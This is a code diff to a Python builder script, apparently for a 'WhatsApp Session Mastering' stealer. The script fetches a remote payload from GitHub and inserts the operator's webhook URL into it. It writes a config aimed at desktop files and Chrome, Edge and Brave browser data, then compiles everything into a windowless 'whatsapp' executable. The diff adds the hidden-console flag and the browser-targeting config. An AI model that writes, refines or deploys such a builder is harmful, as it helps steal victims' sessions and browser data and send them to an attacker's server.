@@ -1,14 +1,17 @@
 from colorama import Fore
-import time
 import os
-import shutil
-import ctypes
+import time
+import json
 import requests
 
 from pystyle import Colors, Colorate, Write, Center, Box
 
 os.system('cls')
-ctypes.windll.kernel32.SetConsoleTitleW("WhatsApp Session Mastering | Testing")
+try:
+    import ctypes
+    ctypes.windll.kernel32.SetConsoleTitleW("WhatsApp Session Mastering | Testing")
+except Exception:
+    pass
 
 banner = """ 
         ╦ ╦╔═╗       
@@ -16,47 +19,86 @@ banner = """
         ╚╩╝╩ ╩       
 """
 
+PAYLOAD_URL = "https://raw.githubusercontent.com/rinsfx/WhatsappMaster/master/payload.py"
+PLACEHOLDER = 'WEBHOOK = "Rins on top"'
+
+
 def _exit():
     print("\n")
-    Write.Print(f"    .$ Exiting program | Please star the repo my g", Colors.yellow_to_red, interval=0.05)
+    Write.Print("    .$ Exiting program | Please star the repo my g",
+                Colors.yellow_to_red, interval=0.05)
     time.sleep(3)
     quit()
 
+
 def _compile():
     print("\n")
-    line = f'pyinstaller --onefile whatsapp.pyw'
-    icox = Write.Input("    .$ Enter icon path (type N for none) -> ", Colors.green_to_blue, interval=0.025)
-    if icox != "N":
-        line += f"--icon={icox}"
-        
-    Write.Print(f"    .$ Compiling to exe ...", Colors.green_to_yellow, interval=0.05)
-    os.system('echo off')
-    print(Fore.BLACK)   
+    line = "pyinstaller --onefile --noconsole whatsapp.pyw"
+    icox = Write.Input("    .$ Enter icon path (type N for none) -> ",
+                       Colors.green_to_blue, interval=0.025)
+    if icox.strip().upper() != "N" and icox.strip():
+        line += f" --icon={icox.strip()}"
+
+    Write.Print("    .$ Compiling to exe ...", Colors.green_to_yellow, interval=0.05)
+    os.system("echo off")
+    print(Fore.BLACK)
     os.system(line)
-    #os.system('cls')
-    print(Colorate.Horizontal(Colors.rainbow, "    .$ Successfuly Compiled", 1))  
+    print(Colorate.Horizontal(Colors.rainbow, "    .$ Successfully Compiled", 1))
     _exit()
+
+
+def _build_config(webhook_url):
+    cfg = {
+        "webhook": webhook_url,
+        "targets": ["desktop", "chrome"],
+        "chrome_browsers": ["chrome", "edge", "brave"],
+        "max_zip_mb": 200,
+        "retries": 10,
+        "retry_delay_sec": 2
+    }
+    with open("config.json", "w", encoding="utf-8") as f:
+        json.dump(cfg, f, indent=2)
+
 
 def main():
     os.system("cls")
-    print("\n") # Formatting stuff
+    print("\n")
     print(Colorate.Horizontal(Colors.green_to_blue, Center.XCenter(banner), 1))
     print(Colorate.Horizontal(Colors.green_to_blue, Box.Lines("made by RinsTest")))
     print("\n")
-    
-    wbh_url = Write.Input("    .$ Enter your WebHook url -> ", Colors.green_to_blue, interval=0.025)
-    Write.Print(f"    .$ Fetching payload ...", Colors.green_to_yellow, interval=0.05)
-    payload = requests.get("https://raw.githubusercontent.com/rinsfx/WhatsappMaster/master/payload.py").text
-    
-    with open("whatsapp.pyw", "w") as f:
-        f.write(payload.replace('WEBHOOK = "RinsTest on top"', f'WEBHOOK = "{wbh_url}"'))
-        
-    Write.Print(f"\n    .$ Payload fetched !", Colors.green_to_cyan, interval=0.05)
-    compiling = Write.Input("\n    .$ Compile to exe [Y/N] -> ", Colors.green_to_blue, interval=0.025)
+
+    wbh_url = Write.Input("    .$ Enter your WebHook url -> ",
+                          Colors.green_to_blue, interval=0.025).strip()
+    if not wbh_url:
+        _exit()
+
+    Write.Print("    .$ Fetching payload ...", Colors.green_to_yellow, interval=0.05)
+    try:
+        payload = requests.get(PAYLOAD_URL, timeout=15).text
+    except Exception as e:
+        Write.Print(f"\n    .$ Fetch failed: {e}", Colors.red_to_yellow, interval=0.05)
+        _exit()
+
+    if PLACEHOLDER not in payload:
+        Write.Print("\n    .$ Placeholder not found in payload — aborting.",
+                    Colors.red_to_yellow, interval=0.05)
+        _exit()
+
+    with open("whatsapp.pyw", "w", encoding="utf-8") as f:
+        f.write(payload.replace(PLACEHOLDER, f'WEBHOOK = "{wbh_url}"'))
+
+    _build_config(wbh_url)
+
+    Write.Print("\n    .$ Payload fetched + config written !",
+                Colors.green_to_cyan, interval=0.05)
+
+    compiling = Write.Input("\n    .$ Compile to exe [Y/N] -> ",
+                            Colors.green_to_blue, interval=0.025).strip().upper()
     if compiling == "Y":
         _compile()
     else:
         _exit()
 
-    
-main()
+
+if __name__ == "__main__":
+    main()
